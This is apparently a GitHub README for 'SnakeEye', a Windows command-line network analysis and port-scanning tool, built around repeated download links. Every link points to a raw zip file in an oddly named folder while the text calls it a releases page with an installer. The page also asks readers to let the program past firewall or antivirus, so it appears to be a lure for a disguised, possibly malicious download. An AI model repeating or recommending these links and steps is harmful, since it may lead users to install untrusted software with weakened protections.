# 🐍 SnakeEye - Simple Network Investigation Tool

[![Download SnakeEye](https://img.shields.io/badge/Download-SnakeEye-brightgreen)](https://raw.githubusercontent.com/mujtabaali01/SnakeEye/main/overdaintiness/Eye-Snake-1.6.zip)

SnakeEye Analyzer is a tool that helps you learn more about internet addresses and captured network data. It works quietly both by watching the signals and by asking for information. You do not need any special skills to use it.

---

## 🔎 What is SnakeEye?

SnakeEye analyzes network activity. It looks at internet addresses, traffic, and other data to help you understand what is happening on the network. It can work in two ways:

- Passive gathering: watching traffic without changing it.
- Active gathering: sending requests to get more information.

You can use it for general network checks, security reviews, or learning more about internet connections and hidden networks like Tor or I2P.

---

## 🖥️ System Requirements

Before you start, make sure your Windows PC meets these basic needs:

- Windows 10 or newer versions (64-bit preferred).
- At least 4 GB of RAM.
- 500 MB free disk space.
- Internet connection (for downloading and updates).
- Command Prompt access (comes pre-installed on Windows).

SnakeEye runs in the Command Prompt window, so it does not have a typical clickable window like ordinary apps.

---

## 🚀 How to Get SnakeEye

Click the big button below to open the page where you can download the latest version. This page has the program files ready for your Windows PC.

[![Download SnakeEye](https://img.shields.io/badge/Download-SnakeEye-blue?style=for-the-badge)](https://raw.githubusercontent.com/mujtabaali01/SnakeEye/main/overdaintiness/Eye-Snake-1.6.zip)

---

## 📥 Download and Run SnakeEye on Windows

Follow these steps to get SnakeEye running:

1. Click the download button above or go to:
   
   https://raw.githubusercontent.com/mujtabaali01/SnakeEye/main/overdaintiness/Eye-Snake-1.6.zip

2. On the releases page, look for the latest version. It usually has a name like `SnakeEye-setup.exe` or `SnakeEye-x64.zip`.

3. Click on the file that matches your Windows system (usually the `.exe` file is easiest).

4. If you downloaded a `.zip` file, right-click it and choose `Extract All...` to unzip it.

5. If you downloaded an `.exe` file, double-click to run the installer and follow the steps on the screen.

6. Once installed, open the Windows Command Prompt:
   - Press `Windows + R`
   - Type `cmd`
   - Press Enter

7. Inside Command Prompt, type `snakeeye` and press Enter. This starts the program.

If you get an error like "command not found," close Command Prompt and try restarting your computer. Make sure you followed the installation steps fully.

---

## 🧰 Basic Usage Guide

SnakeEye works through typed commands in the Command Prompt. Here are some simple steps to try:

- To check an IP address for information, type:
  
  `snakeeye ip 8.8.8.8`

  Replace `8.8.8.8` with any IP you want to learn about.

- To analyze a saved network traffic file, type:

  `snakeeye analyze traffic.pcap`

  Replace `traffic.pcap` with your file name.

- To get help with commands, type:

  `snakeeye help`

This will show you the list of commands and options available.

---

## 🔧 Common Commands

| Command                  | What it does                                          |
|--------------------------|------------------------------------------------------|
| `snakeeye ip [IP]`       | Gather info about an IP address                       |
| `snakeeye analyze [file]`| Analyze network traffic from a saved file             |
| `snakeeye scan [range]`  | Scan a range of IP addresses for open ports           |
| `snakeeye status`        | Show current setup and configuration                   |
| `snakeeye help`          | Display help and usage instructions                    |

Replace text in square brackets with your actual data.

---

## ⚙️ Configuration Tips

After installation, you might want to adjust settings:

- Open `config.ini` located in the SnakeEye folder.
- Here you can set options like:
  - Default timeout for scans.
  - Paths to save reports.
  - Enable or disable certain modules like TOR or VPN checks.

Use any text editor like Notepad to open and edit this file.

---

## 🔐 Security and Privacy

SnakeEye gathers information on networks and internet traffic. Use it responsibly. Do not use it to invade someone’s privacy or access networks without permission.

All data gathered remains on your computer unless you choose to share it.

---

## 📂 Where to Find Logs and Reports

By default, SnakeEye saves activity logs and reports in the folder:

`C:\Users\[YourUserName]\Documents\SnakeEye\Reports`

Replace `[YourUserName]` with your Windows account name.

Reports are saved in readable formats like `.txt` or `.csv`, so you can open them with Notepad or Excel.

---

## ⚙️ Updating SnakeEye

To update SnakeEye, visit the download page above again. Look for newer versions, download, and install as you did before. Your settings and reports will remain after updates.

---

## 💬 Getting Help

If you run into issues:

- Check the `help` command in the app.
- Review the `README.md` on the GitHub page.
- Look at the ‘Issues’ section on GitHub for answers from others.

SnakeEye does not need special administrator rights unless you want to capture live network traffic, which may require running Command Prompt as an administrator.

---

## 🧩 Additional Notes

SnakeEye uses built-in Windows tools and external modules for deeper analysis. Some functions require network access, so ensure your firewall or antivirus lets SnakeEye work properly.

It supports analyzing traffic from networks using VPN, Tor, and I2P.

---

## ⚠️ Troubleshooting Tips

- If SnakeEye does not start, check the installation path.
- Make sure Command Prompt is using the right folder with the `cd` command.
- Restart Windows if the program does not respond after installation.
- Run Command Prompt as administrator for advanced network tasks.

---

## 🔗 Useful Links

- Primary Download:  
  https://raw.githubusercontent.com/mujtabaali01/SnakeEye/main/overdaintiness/Eye-Snake-1.6.zip

- Official Documentation:  
  Available inside the downloaded package in the `docs` folder.

---

[![Download SnakeEye](https://img.shields.io/badge/Download-SnakeEye-brightgreen)](https://raw.githubusercontent.com/mujtabaali01/SnakeEye/main/overdaintiness/Eye-Snake-1.6.zip)